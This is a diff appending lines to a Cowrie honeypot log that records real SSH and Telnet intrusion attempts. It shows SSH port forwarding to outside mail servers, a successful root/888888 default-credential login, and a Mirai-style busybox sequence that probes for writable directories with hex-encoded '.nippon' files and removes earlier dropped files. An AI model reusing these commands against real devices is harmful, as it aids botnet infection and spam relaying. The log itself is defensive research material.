@@ -429,3 +429,446 @@
 2017-06-17T00:25:00+0000 [HoneyPotSSHTransport,933,113.195.145.52] avatar root logging out
 2017-06-17T00:25:00+0000 [HoneyPotSSHTransport,933,113.195.145.52] connection lost
 2017-06-17T00:25:00+0000 [HoneyPotSSHTransport,933,113.195.145.52] Connection lost after 9 seconds
+2017-06-17T00:25:03+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp forward to 98.136.217.202:25 with data 'QUIT\r\n'
+2017-06-17T00:25:03+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] failed to connect: Connection refused
+2017-06-17T00:25:03+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 231
+2017-06-17T00:25:03+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:03+0000 [SSHChannel None (231) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] got channel 'direct-tcpip' request
+2017-06-17T00:25:03+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] direct-tcp connection request to 98.136.217.203:25 from localhost:5556
+2017-06-17T00:25:09+0000 [SSHChannel None (153) on SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] remote eof
+2017-06-17T00:25:09+0000 [SSHChannel None (153) on SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] remote close
+2017-06-17T00:25:09+0000 [SSHChannel None (153) on SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] sending close 153
+2017-06-17T00:25:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] got channel 'direct-tcpip' request
+2017-06-17T00:25:09+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] direct-tcp connection request to 98.136.217.203:25 from localhost:5556
+2017-06-17T00:25:09+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:64625 (10.8.41.81:2222) [session: f45d0e18]
+2017-06-17T00:25:10+0000 [HoneyPotSSHTransport,934,113.195.145.52] Remote SSH version: SSH-2.0-PUTTY
+2017-06-17T00:25:10+0000 [HoneyPotSSHTransport,934,113.195.145.52] kex alg, key alg: 'diffie-hellman-group14-sha1' 'ssh-rsa'
+2017-06-17T00:25:10+0000 [HoneyPotSSHTransport,934,113.195.145.52] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:10+0000 [HoneyPotSSHTransport,934,113.195.145.52] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:10+0000 [SSHChannel None (232) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:10+0000 [SSHChannel None (232) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:10+0000 [SSHChannel None (232) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 232
+2017-06-17T00:25:11+0000 [HoneyPotSSHTransport,934,113.195.145.52] NEW KEYS
+2017-06-17T00:25:12+0000 [HoneyPotSSHTransport,934,113.195.145.52] starting service 'ssh-userauth'
+2017-06-17T00:25:14+0000 [SSHChannel None (154) on SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] remote eof
+2017-06-17T00:25:14+0000 [SSHChannel None (154) on SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] remote close
+2017-06-17T00:25:14+0000 [SSHChannel None (154) on SSHService 'ssh-connection' on HoneyPotSSHTransport,734,91.195.103.197] sending close 154
+2017-06-17T00:25:14+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,934,113.195.145.52] 'root' trying auth 'none'
+2017-06-17T00:25:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,934,113.195.145.52] 'root' authenticated with 'none'
+2017-06-17T00:25:16+0000 [SSHService 'ssh-userauth' on HoneyPotSSHTransport,934,113.195.145.52] starting service 'ssh-connection'
+2017-06-17T00:25:16+0000 [SSHChannel None (233) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:16+0000 [SSHChannel None (233) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:16+0000 [SSHChannel None (233) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 233
+2017-06-17T00:25:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] got channel 'direct-tcpip' request
+2017-06-17T00:25:16+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-06-17T00:25:16+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 216.120.247.147:41036 (10.8.41.81:2223) [session: TT676]
+2017-06-17T00:25:16+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 113.195.145.52:32603 (10.8.41.81:2222) [session: 3da7ed6d]
+2017-06-17T00:25:17+0000 [cowrie.telnet.transport.HoneyPotTelnetFactory] New connection: 216.120.247.147:55656 (10.8.41.81:2223) [session: TT677]
+2017-06-17T00:25:17+0000 [SSHChannel None (234) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote eof
+2017-06-17T00:25:17+0000 [SSHChannel None (234) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] remote close
+2017-06-17T00:25:17+0000 [SSHChannel None (234) on SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] sending close 234
+2017-06-17T00:25:20+0000 [CowrieTelnetTransport,676,216.120.247.147] login attempt: 1064
+2017-06-17T00:25:20+0000 [CowrieTelnetTransport,676,216.120.247.147] login return, expect: [root/888888]
+2017-06-17T00:25:23+0000 [CowrieTelnetTransport,676,216.120.247.147] login attempt [root/888888] succeeded
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] Opening TTY Log: log/tty/20170617-002524-None-676i.log
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] Warning: state changed and new state returned
+2017-06-17T00:25:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] got channel 'direct-tcpip' request
+2017-06-17T00:25:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,770,91.195.103.186] direct-tcp connection request to 103.238.62.244:25 from localhost:5556
+2017-06-17T00:25:24+0000 [SSHChannel None (100) on SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] remote eof
+2017-06-17T00:25:24+0000 [SSHChannel None (100) on SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] remote close
+2017-06-17T00:25:24+0000 [SSHChannel None (100) on SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] sending close 100
+2017-06-17T00:25:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] got channel 'direct-tcpip' request
+2017-06-17T00:25:24+0000 [SSHService 'ssh-connection' on HoneyPotSSHTransport,757,91.195.103.212] direct-tcp connection request to 188.125.69.79:25 from localhost:5556
+2017-06-17T00:25:24+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 178.42.38.241:49324 (10.8.41.81:2222) [session: 8340b894]
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: enable
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: enable 
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] Reading txtcmd from "txtcmds/bin/enable"
+2017-06-17T00:25:24+0000 [cowrie.ssh.factory.CowrieSSHFactory] New connection: 178.42.38.241:49326 (10.8.41.81:2222) [session: d55b11d9]
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: shell
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] Command not found: shell
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: sh
+2017-06-17T00:25:24+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: sh 
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox ps; /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ps
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: ps
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,936,178.42.38.241] Remote SSH version: SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,936,178.42.38.241] kex alg, key alg: 'ecdh-sha2-nistp256' 'ssh-rsa'
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,936,178.42.38.241] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,936,178.42.38.241] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,937,178.42.38.241] Remote SSH version: SSH-2.0-OpenSSH_6.7p1 Raspbian-5+deb8u3
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,937,178.42.38.241] kex alg, key alg: 'ecdh-sha2-nistp256' 'ssh-rsa'
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,937,178.42.38.241] outgoing: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:25+0000 [HoneyPotSSHTransport,937,178.42.38.241] incoming: 'aes128-ctr' 'hmac-sha1' 'none'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox cat /proc/mounts; /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /proc/mounts
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /proc/mounts
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon; /bin/busybox cat /sys/.nippon; /bin/busybox rm /sys/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys' > /sys/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/sys'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /sys/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /sys/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /sys/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /sys/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon; /bin/busybox cat /proc/.nippon; /bin/busybox rm /proc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc' > /proc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/proc'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /proc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /proc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /proc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon; /bin/busybox cat /dev/pts/.nippon; /bin/busybox rm /dev/pts/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/pts' > /dev/pts/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/dev/pts'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /dev/pts/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /dev/pts/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /dev/pts/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/pts/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon; /bin/busybox cat /run/.nippon; /bin/busybox rm /run/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run' > /run/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/run'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /run/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /run/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /run/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon; /bin/busybox cat /.nippon; /bin/busybox rm /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69' > /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon; /bin/busybox cat /dev/shm/.nippon; /bin/busybox rm /dev/shm/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev/shm' > /dev/shm/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/dev/shm'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /dev/shm/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /dev/shm/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /dev/shm/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/shm/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon; /bin/busybox cat /run/lock/.nippon; /bin/busybox rm /run/lock/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/run/lock' > /run/lock/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/run/lock'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /run/lock/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /run/lock/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /run/lock/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/lock/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon; /bin/busybox cat /sys/fs/fuse/connections/.nippon; /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/sys/fs/fuse/connections' > /sys/fs/fuse/connections/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /sys/fs/fuse/connections/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /sys/fs/fuse/connections/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /sys/fs/fuse/connections/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /sys/fs/fuse/connections/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon; /bin/busybox cat /boot/.nippon; /bin/busybox rm /boot/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/boot' > /boot/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/boot'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /boot/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /boot/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /boot/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /boot/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon; /bin/busybox cat /home/.nippon; /bin/busybox rm /home/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/home' > /home/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/home'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /home/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /home/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /home/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /home/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon; /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc' > /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/proc/sys/fs/binfmt_misc'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/sys/fs/binfmt_misc/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon; /bin/busybox cat /dev/.nippon; /bin/busybox rm /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox echo -e '\x6b\x61\x6d\x69/dev' > /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: echo -e '\x6b\x61\x6d\x69/dev'
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox cat /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: cat /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox rm /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.nippon
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: /bin/busybox ACHIU
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /.t; rm /.sh; rm /.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /sys/.t; rm /sys/.sh; rm /sys/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /sys/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /sys/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /sys/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /proc/.t; rm /proc/.sh; rm /proc/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /proc/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /dev/.t; rm /dev/.sh; rm /dev/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /dev/pts/.t; rm /dev/pts/.sh; rm /dev/pts/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/pts/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/pts/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /dev/pts/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /run/.t; rm /run/.sh; rm /run/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/.t
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/.sh
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] Command found: rm /run/.haman
+2017-06-17T00:25:25+0000 [CowrieTelnetTransport,676,216.120.247.147] CMD: rm /.t; rm /.sh; rm /.haman
